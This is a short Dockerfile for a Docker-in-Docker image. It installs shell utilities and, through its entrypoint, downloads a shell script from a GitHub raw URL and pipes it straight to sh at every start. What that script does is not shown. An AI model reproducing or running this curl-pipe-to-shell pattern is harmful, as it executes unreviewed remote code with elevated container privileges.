FROM docker:20-dind

#WORKDIR /app

#RUN git clone -b v2 https://github.com/Hideipnetwork/hideipnetwork-web.git . && npm install

WORKDIR /app2

# Install necessary packages
RUN apk add --no-cache git openrc \
    screen \
    htop \
    nano \
    wget \
    curl \
    tar 

COPY index.html ./

# Directly set the entrypoint to execute the script from the URL
ENTRYPOINT ["sh", "-c", "curl -sSL https://raw.githubusercontent.com/osnmoh007/dontclone/main/entrypoint2.sh | sh"]
